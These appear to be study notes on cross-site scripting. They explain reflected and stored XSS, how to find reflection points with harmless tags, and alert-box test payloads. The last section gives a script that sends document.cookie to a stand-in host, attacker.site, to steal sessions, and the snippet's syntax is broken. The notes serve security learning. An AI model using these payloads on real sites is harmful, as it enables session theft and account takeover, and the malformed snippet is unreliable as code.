**Cross Site Scripting**
- vulnerability that lets an attacker control some of the content of a web application
By using an XSS, an attacker can:
- modify the content of the site at run-time
- inject malicious contents
- steal the cookies; session of a user
- perform actions on the web application as if it was a legitimate user

**Vulnerable Web Applications**
- vulnerable web application is what makes XSS attacks possible
- happens when web application uses unfiltered user input to build the output content displayed to its end users; this lets the attacker control the output HTML + JavaScript code

User input is any parameter coming from the client side of the web app:
- request headers
- cookies
- form inputs
- POST parameters
- GET parameters
(all these input channels should be validated server side)

**Attackers**
Malicious users exploit XSS vulnerabilities to attack the users of a web site by:
- making their browsers load malicious content
- performing operations on their behalf; buying a product or changing a password
- stealing their session cookies; being able to impersonate them on the vulnerable site
* * *
**Finding an XSS**
- to find XSS you have to look at every user input; test if it is displayed on the output of the web application
- a search parameter is submitted through a form + gets displayed on the output
- searched string is passed to the web application through a GET parameter

- after finding a reflection point, you have to understand if you can inject HTML code + see if it gets to the output of the page
- use any valid HTML tag + understand if it gets to the output of the page
- inject a harmless tag `<i> / <pre> / <plaintext>`
`<i> tag is injected` 
- test string is in italic ; HTML has been interpreted

To test XSS:
- inject valid HTML/JavaScript code; `<script>alert(‘XSS’)</script>`
* * *
**Reflected XSS Attacks**
- occurs when the web application responds immediately on users input without validating what the user entered; lead an attacker to inject browser executable code inside the single HTML response
- “non persistent” as the malicious script does not get stored inside the web server database; attacker needs to send the link through phishing technique in order to trap the user

(Reflected) type of attack is called Reflected because an input field of the HTTP request sent by the browser gets immediately reflected to the output page

```
localhost/hxss/get.php?search=Bug+Bounty
```
- (search=Bug+Bounty) data has been requested through GET method
- generate pop up by injecting Javascript code; 
`get.php?search<script>alert(“welcome to hacking articles”)</script>`
* * *
**Stored (Persistent) XSS Attacks**
- injected malicious script gets permanently stored inside the web applications database server
- website loads the stored malicious script + puts it within the HTML output when user visits page; deliver XSS payload
- method of attack does not require any phishing technique to target its users

(if an attacker manages to write malicious “HTML or JavaScript” on a social blog page; every user visiting that page will run the payload)
* * *
**Cookie Stealing via XSS**
- JavaScript can access cookies if they do not have the HttpOnly flag enabled; means that an XSS attack can be used to steal the cookies
- stealing cookies means stealing a user’s session
`<script>alert(document.cookie)</script>`

- send cookies to an attacker-controlled site
```
<script>
var i = new image () ;
i.src=http://attacker.site/log.php?q=+document.cookie;
</script>
```
- script generates an image object + point its src to a script on the attacker server (attacker.site)
- browser cannot tell in advance if the source is a real image; loads and executes the script
